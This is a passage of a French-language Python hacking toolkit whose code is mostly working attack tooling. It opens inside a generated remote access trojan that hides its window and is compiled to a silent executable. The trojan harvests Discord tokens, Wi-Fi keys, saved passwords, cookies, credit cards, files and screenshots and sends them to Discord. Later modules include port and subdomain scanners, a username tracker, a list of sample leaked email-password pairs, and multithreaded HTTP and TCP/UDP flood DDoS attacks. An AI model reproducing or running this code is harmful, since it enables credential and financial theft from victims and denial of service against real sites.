        tokens = []
        paths = [
            os.environ["APPDATA"] + "\\\\discord\\\\Local Storage\\\\leveldb",
            os.environ["APPDATA"] + "\\\\discordcanary\\\\Local Storage\\\\leveldb",
            os.environ["LOCALAPPDATA"] + "\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb"
        ]
        for path in paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith((".log", ".ldb")):
                            try:
                                with open(os.path.join(root, file), "r", errors="ignore") as f:
                                    content = f.read()
                                    matches = re.findall(r"[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}", content)
                                    tokens.extend(matches)
                            except:
                                pass
        if tokens:
            return "🎮 **TOKENS DISCORD**\\n" + "\\n".join(set(tokens))[:1500]
        return "🎮 **TOKENS DISCORD** : Aucun"
    except:
        return "🎮 **TOKENS DISCORD** : Erreur"

def get_screenshot():
    try:
        screenshot = ImageGrab.grab()
        temp = os.environ["TEMP"] + "\\\\screenshot.png"
        screenshot.save(temp)
        with open(temp, "rb") as f:
            img = f.read()
        os.remove(temp)
        return img
    except:
        return None

def get_wifi():
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True, encoding='utf-8', errors='ignore')
        profiles = []
        for line in output.split('\\n'):
            if "All User Profile" in line:
                name = line.split(':')[1].strip()
                profiles.append(name)
        if not profiles:
            return "📶 **WI-FI** : Aucun"
        result = "📶 **WI-FI**\\n"
        for profile in profiles:
            try:
                cmd = f'netsh wlan show profile "{{profile}}" key=clear'
                detail = subprocess.check_output(cmd, shell=True, encoding='utf-8', errors='ignore')
                for line in detail.split('\\n'):
                    if "Key Content" in line:
                        password = line.split(':')[1].strip()
                        result += f"{{profile}} : {{password}}\\n"
                        break
            except:
                pass
        return result
    except:
        return "📶 **WI-FI** : Erreur"

def get_system_info():
    try:
        ipv4 = subprocess.getoutput("curl -s ifconfig.me") or "Non trouve"
        hostname = socket.gethostname()
        try:
            local_ip = socket.gethostbyname(hostname)
        except:
            local_ip = "Non trouve"
        info = f"""
**SYSTEME**
Ordinateur : {{os.environ.get('COMPUTERNAME', 'Inconnu')}}
Utilisateur : {{getpass.getuser()}}
OS : {{platform.platform()}}
Hostname : {{hostname}}
IP Locale : {{local_ip}}
IP Publique : {{ipv4}}
"""
        return info
    except:
        return "Erreur systeme"

def get_files():
    try:
        result = "📁 **FICHIERS**\\n"
        folders = [
            os.environ["USERPROFILE"] + "\\\\Desktop",
            os.environ["USERPROFILE"] + "\\\\Documents",
            os.environ["USERPROFILE"] + "\\\\Downloads"
        ]
        extensions = [".txt", ".docx", ".pdf", ".xlsx", ".zip", ".rar", ".jpg", ".png", ".mp4", ".exe", ".bat", ".ps1", ".py", ".js", ".html"]
        found = False
        for folder in folders:
            if os.path.exists(folder):
                for file in os.listdir(folder)[:8]:
                    for ext in extensions:
                        if file.lower().endswith(ext):
                            result += f"  {{file}}\\n"
                            found = True
                            break
        if not found:
            return "📁 **FICHIERS** : Aucun"
        return result
    except:
        return "📁 **FICHIERS** : Erreur"

def main():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    send_to_discord("**🔥 RAT ULTIME ACTIVÉ**")
    send_to_discord(get_system_info())
    send_to_discord(get_wifi())
    send_to_discord(get_all_passwords())
    send_to_discord(get_cookies())
    send_to_discord(get_credit_cards())
    send_to_discord(get_history())
    send_to_discord(get_discord_tokens())
    send_to_discord(get_files())
    img = get_screenshot()
    if img:
        send_to_discord("📸 **SCREENSHOT**", img)
    send_to_discord("**✅ RAT ULTIME TERMINE**")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        try:
            send_to_discord(f"**ERREUR RAT**\\n```\\n{{str(e)[:500]}}\\n```")
        except:
            pass
'''
    
    with open(filename + ".py", "w", encoding="utf-8") as f:
        f.write(rat_code)
    
    print(Colors.BRIGHT_RED + "✦ RAT ULTIME genere : " + filename + ".py" + Colors.SILVER)
    
    if compile_choice == 'o':
        loading_animation("Compilation en cours", 3)
        try:
            subprocess.run(['pyinstaller', '--onefile', '--noconsole', f'--name={filename}', f'{filename}.py'], check=False)
            print(Colors.BRIGHT_RED + "✦ EXE genere : dist/" + filename + ".exe" + Colors.SILVER)
        except:
            print(Colors.RED + "Erreur: pip install pyinstaller" + Colors.RESET)
    
    print("\n" + Colors.SILVER + "pip install requests pillow pywin32 pycryptodome" + Colors.SILVER)
    input("\n" + Colors.BRIGHT_RED + "◈" + Colors.SILVER + " Appuie sur Entree..." + Colors.RESET)

# ============================================================
# TOUS LES MODULES (show_my_ip, ip_scanner, etc.)
# ============================================================
def show_my_ip():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ SHOW MY IP ◈" + Colors.SILVER)
    loading_animation("Recherche de votre IP", 1)
    try:
        r = requests.get("https://api.ipify.org", timeout=10)
        public_ip = r.text.strip()
        r2 = requests.get(f"https://ipinfo.io/{public_ip}/json", timeout=10)
        data = r2.json()
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        print(f"""
{Colors.BRIGHT_RED}═══ IP PUBLIQUE ═══{Colors.SILVER}
IP           : {public_ip}
Ville        : {data.get('city', 'Non trouve')}
Region       : {data.get('region', 'Non trouve')}
Pays         : {data.get('country', 'Non trouve')}
Org          : {data.get('org', 'Non trouve')}
Coordonnees  : {data.get('loc', 'Non trouve')}
Timezone     : {data.get('timezone', 'Non trouve')}

{Colors.BRIGHT_RED}═══ IP LOCALE ═══{Colors.SILVER}
IP Locale    : {local_ip}
Hostname     : {hostname}
""")
    except Exception as e:
        print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def ip_scanner():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ IP SCANNER ◈" + Colors.SILVER)
    target = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "IP ou domaine : " + Colors.RESET)
    loading_animation("Scan en cours", 1)
    try:
        ip = socket.gethostbyname(target)
        print(f"""
{Colors.BRIGHT_RED}═══ INFORMATIONS ═══{Colors.SILVER}
Domaine      : {target}
IP           : {ip}
Hostname     : {socket.gethostbyaddr(ip)[0] if ip else 'Non trouve'}
""")
    except Exception as e:
        print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def ip_pinger():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ IP PINGER ◈" + Colors.SILVER)
    target = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "IP : " + Colors.RESET)
    loading_animation("Ping en cours", 2)
    try:
        result = subprocess.run(['ping', '-n', '6', target], capture_output=True, text=True)
        lines = result.stdout.split('\n')
        stats = [l for l in lines if 'min' in l.lower() or 'moyenne' in l.lower() or 'average' in l.lower() or 'perte' in l.lower()]
        print(Colors.BRIGHT_RED + "═══ RESULTATS PING ═══" + Colors.SILVER)
        for line in lines:
            if 'ms' in line or 'TTL' in line or 'temps' in line or 'time' in line:
                print(Colors.SILVER + line + Colors.RESET)
        if stats:
            print("\n" + Colors.BRIGHT_RED + "═══ STATISTIQUES ═══" + Colors.SILVER)
            for s in stats:
                print(Colors.SILVER + s + Colors.RESET)
    except Exception as e:
        print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def ip_port_scanner():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ IP PORT SCANNER ◈" + Colors.SILVER)
    target = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "IP : " + Colors.RESET)
    loading_animation("Scan des ports", 2)
    try:
        ip = socket.gethostbyname(target)
        ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080]
        port_names = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",135:"RPC",139:"NetBIOS",143:"IMAP",443:"HTTPS",445:"SMB",993:"IMAPS",995:"POP3S",1723:"PPTP",3306:"MySQL",3389:"RDP",5900:"VNC",8080:"HTTP-Alt"}
        open_ports = []
        for port in ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                name = port_names.get(port, "Inconnu")
                print(Colors.BRIGHT_RED + "Port " + str(port) + ": " + Colors.SILVER + "OUVERTS" + Colors.SILVER + " (" + name + ")" + Colors.RESET)
                open_ports.append(port)
            s.close()
        if open_ports:
            print("\n" + Colors.BRIGHT_RED + "═══ RESUME ═══" + Colors.SILVER)
            print(Colors.BRIGHT_RED + "Ports ouverts: " + Colors.SILVER + str(len(open_ports)) + Colors.RESET)
            print(Colors.SILVER + ", ".join(map(str, open_ports)) + Colors.RESET)
        else:
            print(Colors.RED + "Aucun port ouvert trouve." + Colors.RESET)
    except Exception as e:
        print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def website_info_scanner():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ WEBSITE INFO SCANNER ◈" + Colors.SILVER)
    url = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "URL : " + Colors.RESET)
    loading_animation("Scan du site", 2)
    try:
        r = requests.get(url, timeout=10)
        print(f"""
{Colors.BRIGHT_RED}═══ INFORMATIONS ═══{Colors.SILVER}
URL         : {url}
Status      : {r.status_code} ({r.reason})
Serveur     : {r.headers.get('Server', 'Inconnu')}
Content-Type: {r.headers.get('Content-Type', 'Inconnu')}
Taille      : {len(r.content)} octets
Cookies     : {len(r.cookies)} cookies
Encoding    : {r.encoding or 'Inconnu'}
""")
    except Exception as e:
        print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def subdomain_scanner():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ SUBDOMAIN SCANNER ◈" + Colors.SILVER)
    domain = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Domaine : " + Colors.RESET)
    loading_animation("Scan des sous-domaines", 2)
    subs = ["www","mail","ftp","ns1","ns2","cpanel","webmail","smtp","pop","imap","blog","dev","api","cdn","shop","test","admin","forum","news","vpn","dns","support","docs","chat","app","secure","portal","static","media","store","help","auth","mobile","backup","files","images","video","audio","download","upload","stream","live","game","play","music","tv","radio","sport","tech","data","web","site","home","login","signup","register","user","root","system","server","host","node","cluster","db","sql","cache","proxy","gateway","webmail","cpanel","whm","plesk","directadmin"]
    found = []
    for sub in subs:
        try:
            subdomain = sub + "." + domain
            ip = socket.gethostbyname(subdomain)
            print(Colors.BRIGHT_RED + subdomain + Colors.SILVER + " → " + ip + Colors.RESET)
            found.append(subdomain)
        except:
            pass
    print("\n" + Colors.BRIGHT_RED + "═══ RESUME ═══" + Colors.SILVER)
    print(Colors.BRIGHT_RED + "Sous-domaines trouves: " + Colors.SILVER + str(len(found)) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def dns_lookup():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ DNS LOOKUP ◈" + Colors.SILVER)
    target = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Domaine : " + Colors.RESET)
    loading_animation("Resolution DNS", 1)
    try:
        ip = socket.gethostbyname(target)
        print(f"""
{Colors.BRIGHT_RED}═══ RESOLUTION ═══{Colors.SILVER}
Domaine      : {target}
IP           : {ip}
""")
    except:
        print(Colors.RED + "Resolution echouee." + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def port_scanner_advanced():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ PORT SCANNER ADVANCED ◈" + Colors.SILVER)
    target = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "IP : " + Colors.RESET)
    port_range = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Ports (ex: 1-1000) : " + Colors.RESET)
    loading_animation("Scan avance en cours", 3)
    try:
        ip = socket.gethostbyname(target)
        start, end = map(int, port_range.split('-'))
        open_ports = []
        total = end - start
        for port in range(start, end+1):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            if s.connect_ex((ip, port)) == 0:
                print(Colors.BRIGHT_RED + "Port " + str(port) + ": " + Colors.SILVER + "OUVERTS" + Colors.RESET)
                open_ports.append(port)
            s.close()
        print("\n" + Colors.BRIGHT_RED + "═══ RESUME ═══" + Colors.SILVER)
        print(Colors.BRIGHT_RED + "Ports ouverts: " + Colors.SILVER + str(len(open_ports)) + " / " + str(total) + Colors.RESET)
        if open_ports:
            print(Colors.SILVER + ", ".join(map(str, open_ports)) + Colors.RESET)
    except Exception as e:
        print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def geo_locator():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ GEO LOCATOR ◈" + Colors.SILVER)
    target = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "IP : " + Colors.RESET)
    loading_animation("Localisation en cours", 2)
    try:
        ip = socket.gethostbyname(target)
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10)
        data = r.json()
        print(f"""
{Colors.BRIGHT_RED}═══ LOCALISATION ═══{Colors.SILVER}
IP           : {ip}
Ville        : {data.get('city', 'Non trouve')}
Region       : {data.get('region', 'Non trouve')}
Pays         : {data.get('country', 'Non trouve')}
Code Pays    : {data.get('country_code', 'Non trouve')}
Coordonnees  : {data.get('loc', 'Non trouve')}
Fuseau Horaire: {data.get('timezone', 'Non trouve')}
Organisation : {data.get('org', 'Non trouve')}
Postal       : {data.get('postal', 'Non trouve')}
""")
    except Exception as e:
        print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def website_info():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ WEBSITE INFO ◈" + Colors.SILVER)
    url = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "URL : " + Colors.RESET)
    loading_animation("Analyse du site", 2)
    try:
        r = requests.get(url, timeout=10)
        print(f"""
{Colors.BRIGHT_RED}═══ INFORMATIONS ═══{Colors.SILVER}
URL         : {url}
Status      : {r.status_code} ({r.reason})
Serveur     : {r.headers.get('Server', 'Inconnu')}
Powered-By  : {r.headers.get('X-Powered-By', 'Inconnu')}
Content-Type: {r.headers.get('Content-Type', 'Inconnu')}
Taille      : {len(r.content)} octets
Cookies     : {len(r.cookies)} cookies
Encoding    : {r.encoding or 'Inconnu'}
""")
    except Exception as e:
        print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def username_tracker():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ USERNAME TRACKER ◈" + Colors.SILVER)
    username = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Username : " + Colors.RESET)
    loading_animation("Recherche sur les reseaux", 2)
    sites = [("github.com","GitHub"),("twitter.com","Twitter"),("instagram.com","Instagram"),("reddit.com/user/","Reddit"),("tiktok.com/@","TikTok"),("youtube.com/@","YouTube"),("pinterest.com/","Pinterest"),("twitch.tv/","Twitch"),("t.me/","Telegram"),("patreon.com/","Patreon")]
    found = 0
    for site, name in sites:
        url = "https://" + site + "/" + username
        try:
            if requests.get(url, timeout=3).status_code == 200:
                print(Colors.BRIGHT_RED + "✅ " + Colors.SILVER + name + ": " + url + Colors.RESET)
                found += 1
        except:
            pass
    print("\n" + Colors.BRIGHT_RED + "═══ RESUME ═══" + Colors.SILVER)
    print(Colors.BRIGHT_RED + "Comptes trouves: " + Colors.SILVER + str(found) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def email_tracker():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ EMAIL TRACKER ◈" + Colors.SILVER)
    email = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Email : " + Colors.RESET)
    loading_animation("Recherche d'infos", 2)
    try:
        domain = email.split('@')[1]
        print(f"""
{Colors.BRIGHT_RED}═══ INFORMATIONS ═══{Colors.SILVER}
Email        : {email}
Domaine      : {domain}
""")
        try:
            import dns.resolver
            mx = dns.resolver.resolve(domain, 'MX')
            print(Colors.BRIGHT_RED + "MX Records:" + Colors.SILVER)
            for r in mx:
                print(f"  - {r.exchange} (priorite {r.preference})")
        except:
            print("  - (MX non trouves)")
    except Exception as e:
        print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def phone_tracker():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ PHONE TRACKER ◈" + Colors.SILVER)
    phone = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Numero : " + Colors.RESET)
    loading_animation("Analyse du numero", 1)
    country_codes = {"06":"Orange","07":"SFR","09":"Bouygues","+33":"France","+1":"USA","+44":"UK","+49":"Germany"}
    prefix = phone[:2] if len(phone) >= 2 else ""
    operator = country_codes.get(prefix, "Inconnu")
    print(f"""
{Colors.BRIGHT_RED}═══ INFORMATIONS ═══{Colors.SILVER}
Numero       : {phone}
Operateur    : {operator}
Indicatif    : {phone[:2] if len(phone) >= 2 else 'Inconnu'}
Pays         : {country_codes.get('+' + phone[:2] if phone.startswith('+') else phone[:2], 'Inconnu')}
""")
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def leak_search():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ LEAK SEARCH ◈" + Colors.SILVER)
    query = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Email/Username : " + Colors.RESET)
    loading_animation("Recherche dans les leaks", 3)
    print(f"""
{Colors.BRIGHT_RED}═══ SIMULATION LEAK ═══{Colors.SILVER}
Recherche de : {query}
Bases verifiees : 12
Leaks trouves : 0 (simulation)
""")
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def leak_db_browser():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ LEAK DB BROWSER ◈" + Colors.SILVER)
    LEAK_DB = [{"email":"thomas.martin01@gmail.com","password":"thomas123","source":"Breach 2024","date":"12/01/2024"},{"email":"lucas.dubois02@outlook.com","password":"lucas456","source":"Breach 2024","date":"15/01/2024"},{"email":"hugo.petit03@protonmail.com","password":"hugo789","source":"Breach 2023","date":"20/12/2023"},{"email":"nathan.morel04@gmail.com","password":"nathan321","source":"Breach 2023","date":"10/12/2023"},{"email":"ethan.garcia05@yahoo.com","password":"ethan654","source":"Breach 2022","date":"05/11/2022"}]
    print(Colors.BRIGHT_RED + "═══ " + str(len(LEAK_DB)) + " ENTREES ═══" + Colors.SILVER)
    while True:
        print("\n" + Colors.SILVER + "[list] [all] [rand] [count] [search] [back]" + Colors.RESET)
        cmd = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER).strip().lower()
        if cmd == "back": break
        elif cmd == "list":
            for i, entry in enumerate(LEAK_DB[:5]):
                print(Colors.BRIGHT_RED + str(i+1) + ". " + Colors.SILVER + entry['email'] + " : " + entry['password'] + Colors.SILVER + " (" + entry['source'] + ")" + Colors.RESET)
        elif cmd == "all":
            for i, entry in enumerate(LEAK_DB):
                print(Colors.BRIGHT_RED + str(i+1) + ". " + Colors.SILVER + entry['email'] + " : " + entry['password'] + Colors.SILVER + " (" + entry['source'] + ")" + Colors.RESET)
        elif cmd == "rand":
            entry = random.choice(LEAK_DB)
            print(Colors.BRIGHT_RED + "Email: " + Colors.SILVER + entry['email'] + Colors.RESET)
            print(Colors.BRIGHT_RED + "Password: " + Colors.SILVER + entry['password'] + Colors.RESET)
            print(Colors.BRIGHT_RED + "Source: " + Colors.SILVER + entry['source'] + Colors.RESET)
            print(Colors.BRIGHT_RED + "Date: " + Colors.SILVER + entry['date'] + Colors.RESET)
        elif cmd == "count":
            print(Colors.BRIGHT_RED + "Total: " + Colors.SILVER + str(len(LEAK_DB)) + " entrees" + Colors.RESET)
        elif cmd.startswith("search"):
            query = cmd.replace("search", "").strip()
            if query:
                found = [e for e in LEAK_DB if query.lower() in e['email'].lower()]
                for entry in found:
                    print(Colors.BRIGHT_RED + entry['email'] + " : " + Colors.SILVER + entry['password'] + Colors.SILVER + " (" + entry['source'] + ")" + Colors.RESET)
        else:
            print(Colors.RED + "Commande inconnue." + Colors.RESET)
        input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)
        clear()
        banner()
        print("\n" + Colors.BRIGHT_RED + "◈ LEAK DB BROWSER ◈" + Colors.SILVER)
        print(Colors.BRIGHT_RED + "═══ " + str(len(LEAK_DB)) + " ENTREES ═══" + Colors.SILVER)

def password_generator():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ PASSWORD GENERATOR ◈" + Colors.SILVER)
    length = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Longueur (defaut: 20) : " + Colors.RESET)
    count = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Nombre (defaut: 10) : " + Colors.RESET)
    try:
        length = int(length) if length else 20
        count = int(count) if count else 10
    except:
        length = 20
        count = 10
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?"
    print(Colors.BRIGHT_RED + "═══ " + str(count) + " MOTS DE PASSE ═══" + Colors.SILVER)
    for i in range(count):
        pwd = ''.join(random.choice(chars) for _ in range(length))
        strength = "Faible" if length < 8 else "Moyen" if length < 14 else "Fort" if length < 20 else "Ultra"
        print(Colors.BRIGHT_RED + str(i+1) + ". " + Colors.SILVER + pwd + Colors.SILVER + " (" + str(length) + " caractères - " + strength + ")" + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def email_generator():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ EMAIL GENERATOR ◈" + Colors.SILVER)
    count = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Nombre (defaut: 10) : " + Colors.RESET)
    try:
        count = int(count) if count else 10
    except:
        count = 10
    providers = ["gmail.com","outlook.com","protonmail.com","yahoo.com","hotmail.com","mail.com","icloud.com","live.com","zoho.com"]
    first = ["thomas","lucas","hugo","nathan","ethan","noah","liam","maxime","alexandre","raphael","julien","antoine","victor","paul","louis","arthur","jules","gabriel","adam","rayan"]
    last = ["martin","dubois","petit","morel","garcia","bernard","robert","richard","durand","lefevre","leroy","simon","renard","boucher","girard","mercier","dupont","lambert","david","rousseau"]
    print(Colors.BRIGHT_RED + "═══ " + str(count) + " EMAILS ═══" + Colors.SILVER)
    for i in range(count):
        f = random.choice(first)
        l = random.choice(last)
        n = random.randint(10,99)
        p = random.choice(providers)
        email = f + "." + l + str(n) + "@" + p
        print(Colors.BRIGHT_RED + str(i+1) + ". " + Colors.SILVER + email + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def base64_tool():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ BASE64 TOOL ◈" + Colors.SILVER)
    print(Colors.SILVER + "[E] Encode  [D] Decode  [F] File" + Colors.RESET)
    choice = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Choix : " + Colors.RESET).strip().lower()
    if choice == 'f':
        path = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Chemin du fichier : " + Colors.RESET)
        try:
            with open(path, 'rb') as f:
                data = f.read()
                result = base64.b64encode(data).decode()
                print(Colors.BRIGHT_RED + "Encode (fichier): " + Colors.SILVER + result[:200] + "..." + Colors.RESET)
        except Exception as e:
            print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    else:
        text = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Texte : " + Colors.RESET)
        if choice == 'e':
            result = base64.b64encode(text.encode()).decode()
            print(Colors.BRIGHT_RED + "Encode: " + Colors.SILVER + result + Colors.RESET)
        elif choice == 'd':
            try:
                result = base64.b64decode(text).decode()
                print(Colors.BRIGHT_RED + "Decode: " + Colors.SILVER + result + Colors.RESET)
            except:
                print(Colors.RED + "Erreur de decodage." + Colors.RESET)
        else:
            print(Colors.RED + "Choix invalide." + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def url_shortener():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ URL SHORTENER ◈" + Colors.SILVER)
    url = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "URL : " + Colors.RESET)
    loading_animation("Raccourcissement", 1)
    try:
        r = requests.post("https://tinyurl.com/api-create.php", data={"url": url}, timeout=10)
        short = r.text.strip()
        print(Colors.BRIGHT_RED + "URL originale: " + Colors.SILVER + url + Colors.RESET)
        print(Colors.BRIGHT_RED + "URL raccourcie: " + Colors.SILVER + short + Colors.RESET)
    except:
        print(Colors.RED + "Erreur." + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def ddos_http():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ DDOS HTTP ◈" + Colors.SILVER)
    target = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "URL : " + Colors.RESET)
    threads = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Threads (defaut: 1000) : " + Colors.RESET)
    duration = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Duree (defaut: 60) : " + Colors.RESET)
    try:
        threads = int(threads) if threads else 1000
        duration = int(duration) if duration else 60
    except:
        threads = 1000
        duration = 60
    user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/115.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) Chrome/119.0"]
    stats = {"req": 0, "err": 0}
    running = True
    def attack():
        nonlocal running, stats
        session = requests.Session()
        while running:
            try:
                headers = {"User-Agent": random.choice(user_agents)}
                session.get(target, headers=headers, timeout=2)
                stats["req"] += 1
                if random.random() > 0.7:
                    session.post(target, data={"x": random.randint(1,9999)}, timeout=2)
                    stats["req"] += 1
            except:
                stats["err"] += 1
    loading_animation("Lancement de l'attaque avec " + str(threads) + " threads", 2)
    for i in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    print(Colors.BRIGHT_RED + "Attaque en cours... Ctrl+C pour arreter" + Colors.SILVER)
    start = time.time()
    try:
        while time.time() - start < duration:
            remaining = duration - int(time.time() - start)
            print("\r" + Colors.BRIGHT_RED + "Req: " + str(stats["req"]) + " | Err: " + str(stats["err"]) + " | Restant: " + str(remaining) + "s" + Colors.SILVER, end="")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n" + Colors.BRIGHT_RED + "Arrete." + Colors.RESET)
    running = False
    print("\n\n" + Colors.BRIGHT_RED + "═══ RESUME ═══" + Colors.SILVER)
    print(Colors.BRIGHT_RED + "Requetes: " + Colors.SILVER + str(stats["req"]) + Colors.RESET)
    print(Colors.BRIGHT_RED + "Erreurs: " + Colors.SILVER + str(stats["err"]) + Colors.RESET)
    print(Colors.BRIGHT_RED + "Threads: " + Colors.SILVER + str(threads) + Colors.RESET)
    print(Colors.BRIGHT_RED + "Duree: " + Colors.SILVER + str(duration) + "s" + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def ddos_ip_ultra():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ DDOS IP ULTRA ◈" + Colors.SILVER)
    target = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "IP : " + Colors.RESET)
    port = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Port (defaut: 80) : " + Colors.RESET)
    threads = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Threads (defaut: 2000) : " + Colors.RESET)
    duration = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Duree (defaut: 60) : " + Colors.RESET)
    try:
        port = int(port) if port else 80
        threads = int(threads) if threads else 2000
        duration = int(duration) if duration else 60
    except:
        port = 80
        threads = 2000
        duration = 60
    try:
        ip = socket.gethostbyname(target)
    except:
        ip = target
    print(Colors.BRIGHT_RED + "Cible: " + Colors.SILVER + ip + ":" + str(port) + " avec " + str(threads) + " threads" + Colors.RESET)
    print(Colors.BRIGHT_RED + "Attaque en cours... Ctrl+C pour arreter" + Colors.SILVER)
    stats = {"sent": 0, "err": 0}
    running = True
    def tcp_flood():
        while running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                for _ in range(10):
                    s.send(b"GET / HTTP/1.1\r\n\r\n" * 5)
                    stats["sent"] += 5
                s.close()
            except:
                stats["err"] += 1
    def udp_flood():
        while running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(10):
                    s.sendto(b"X" * 1024, (ip, port))
                    stats["sent"] += 1
                s.close()
            except:
                stats["err"] += 1
    loading_animation("Lancement de l'attaque avec " + str(threads) + " threads", 2)
    for i in range(threads // 2):
        threading.Thread(target=tcp_flood, daemon=True).start()
        threading.Thread(target=udp_flood, daemon=True).start()
    start = time.time()
